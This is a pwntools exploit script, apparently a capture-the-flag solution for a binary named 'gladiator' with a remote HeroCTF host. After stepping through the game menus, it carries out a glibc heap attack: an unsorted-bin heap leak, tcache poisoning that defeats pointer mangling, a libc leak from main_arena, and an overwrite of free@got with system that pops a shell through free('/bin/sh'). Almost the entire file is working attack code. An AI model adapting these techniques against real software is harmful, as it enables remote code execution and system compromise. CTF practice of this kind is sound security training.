from pwn import *

elf = context.binary = ELF("./gladiator")
libc = ELF(b"/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF(b"./libc.so.6")
context.log_level = 'DEBUG'

gs = '''
b main
'''

def start():
    if args.GDB:
        context.log_level = 'DEBUG'
        r = gdb.debug(elf.path, gdbscript=gs)
    
    elif args.REMOTE:
        r = remote("static-03.heroctf.fr", 5004)
        # r = remote("127.0.0.1", 22)
    
    else:
        r = process(elf.path)
    
    return r

def choice(choice):
    r.recvuntil(b">>> Your choice: ")
    r.sendline(choice)

def blow_npc():
    # Fluuuuurrry of bloooows!
    r.recvuntil(b">>> How many blows ? ")
    r.sendline(b"20")

def kill_witch():
    # Perlimpinpin bags
    # choice(b"3")
    r.sendline(b"3")
    r.recvuntil(b">>> You can take up to 10 bags, how many do you want? ")
    r.sendline(b"4")
    
    for i in range(4):
        r.recvuntil(b">>> How many grams do you want in the bag")
        r.sendline(b"10")
    
    # Use your object 
    choice(b"3")
    r.recvuntil(b"[+] Choose a bag of perlimpinpin powder between 0 and 3: ")
    r.sendline(b"0")


def choose_object_level3():
    choice(b"2")
    

def alloc_enchantment(index, size, data):
    choice(b"1")
    r.recvuntil(b"[+] Enter the enchant index: ")
    r.sendline(index)
    r.recvuntil(b"[+] Enter the enchant size: ")
    r.sendline(size)
    r.recvuntil(b"[+] Enter your spell: ")
    r.sendline(data)

def remove_enchantment(index):
    choice(b"2")
    r.recvuntil(b"[+] Enter the enchant index: ")
    r.sendline(index)

def check_enchantment(index):
    choice(b"3")
    r.recvuntil(b"[+] Enter the enchant index: ")
    r.sendline(index)
    r.recvuntil(b"[+] You read the enchant: ")
    return r.recvuntil(b"\n=========")




def menu4(choice):
    r.recvuntil(b">>> Your choice: ")
    r.sendline(choice)

def add(index, size):
    menu4(b"1")
    r.recvuntil(b"[+] Enter the page index that you want to write to: ")
    r.sendline(index)
    r.recvuntil(b"[+] Enter the size of the commandment: ")
    r.sendline(size)
    r.recvuntil(b"[+] New page for commandment")

def edit(index, data):
    menu4(b"2")
    r.recvuntil(b"[+] Enter the page index to rewrite: ")
    r.sendline(index)
    r.recvuntil(b"[+] Write the commandment")
    r.sendline(data)


def free(index):
    menu4(b"3")
    r.recvuntil(b"[+] Enter index page to delete: ")
    r.sendline(index)


def show(index):
    menu4(b"4")
    r.recvuntil(b"[+] Enter index page to read: ")
    r.sendline(index)
    return r.recvuntil(b"\n=========")



def add_big_page(index, size):
    r.sendline(b"1")
    r.recvuntil(b"[+] Enter the page index that you want to write to: ")
    r.sendline(index)
    r.recvuntil(b"[+] Enter the size of the commandment: ")
    r.sendline(size)
    r.recvuntil(b"[+] (God): Not this one!")






def diff(heap, target):
    return target ^ (heap >> 0xc)


def main():
    
    global r
    r = start()

    ########### NPC ###########
    check_death = b"[+] The random NPC is dead!"
    while(1):
        r.sendline(b"2")
        blow_npc()
        if check_death in r.recv():
            log.success('NPC IS DEAD')
            break

    sleep(1)
    ########## WITCH ##########
    kill_witch()

    r.recvuntil(b"[+] The witch is dead!")
    log.success('WITCH IS DEAD')


    ####### NIGHT KING ########

    sleep(1)
    choose_object_level3()

    sleep(1)


    alloc_enchantment(b"23", b"104", b"")
    alloc_enchantment(b"0", b"1048", b"")
    alloc_enchantment(b"1", b"10", b"")

    remove_enchantment(b"0")
    remove_enchantment(b"1")

    alloc_enchantment(b"2", b"1048", b"")

    leak = check_enchantment(b"2")
    leak = int.from_bytes(leak[0:6], 'little')
    log.success(f'Leak Heap level 3: {hex(leak)}')



    for i in range(7):
        alloc_enchantment(str(i+3).encode(), b"104", b"")

    alloc_enchantment(b"10", b"104", b"")


    for i in range(7):
        remove_enchantment(str(i+3).encode())


    remove_enchantment(b"10") # goes in fastbin


    for i in range(7):
        alloc_enchantment(str(i+3+7+1).encode(), b"104", b"")


    remove_enchantment(b"10")

    heap = leak 
    heap = heap >> 0xc
    target = leak + 0x8000000 + 0xb60 # next arena + offset to malloc at night king chunk
    log.success(f'Target: {hex(target)}')

    fake_fd = (heap+1) ^ target

    alloc_enchantment(b"10", b"104", p64(fake_fd))
    sleep(2)
    alloc_enchantment(b"19", b"104", b"\x00"*8)
    alloc_enchantment(b"20", b"104", b"\x00"*16)


    log.success('NIGHT KING IS DEAD')


    ####### GOD ########

    r.recvuntil("[+] (God): You have only 10 tries, I don't have your time.\n")


    # ------------
    # 1) Use unsorted bin to leak the pointer to next arena
    # 2) Tcache poisonning to have chunk there and leak main_arena
    # 3) Second tcache poisonning to overwrite got


    #############

    add_big_page(b"0", b"1048")
    add(b"1", b"10")

    free(b"0")
    leak = show(b"0")

    leak = int.from_bytes(leak[0x1a:0x20], 'little')

    ############

    # From that we can make a chunk there and leak the main_arena addr

    add(b"2",b"104")
    add(b"3",b"104")
    free(b"2")
    free(b"3")


    heap = leak - 0x90
    log.success(f"heap: {hex(heap)}")

    target = heap + 0x890 # offset next
    log.success(f"target: {hex(target)}")

    fake_fd = diff(heap+1, target+1)
    log.success(f"fake fd: {hex(fake_fd)}")

    edit(b"3", p64(fake_fd))

    ################## LEAK LIBC ##################
    add(b"4",b"104")
    add(b"5",b"104")
    leak_libc = show(b"5")
    leak_libc = int.from_bytes(leak_libc[0x2a:0x30], 'little') # leak main_arena
    leak_libc = leak_libc - 0x218c80 - 0x1000 # libc = main_arena - offset
    log.success(f"LEAK LIBC: {hex(leak_libc)}")
    libc.address = leak_libc

    ################ OVERWRITE GOT ################
    # free(pointer_with_bin_sh) -> system("/bin/sh")

    add(b"6", b"24")
    add(b"7", b"24")

    free(b"6")
    free(b"7")
    pause()

    # Now that we have libc address we can have a shell !
    # TARGET: free@got - Because NO PIE

    target = elf.got.free + 1 - 8   # For alignement
    fake_fd = diff(heap, target)

    log.success(f"Target: {hex(target)}")
    log.success(f"Fake fd: {hex(fake_fd)}")

    edit(b"7", p64(fake_fd)) # overwrite fd to point to free@got
    add(b"8", b"24")    # so next malloc will be at free@got
    edit(b"8", b"")
    add(b"9", b"24")    # overwrite free@got
    edit(b"9", p64(libc.sym.pthread_cond_wait) + p64(libc.sym.system))
    edit(b"4", b"/bin/sh\0")
    free(b"4")



    r.interactive()


if __name__ == "__main__":
    main()
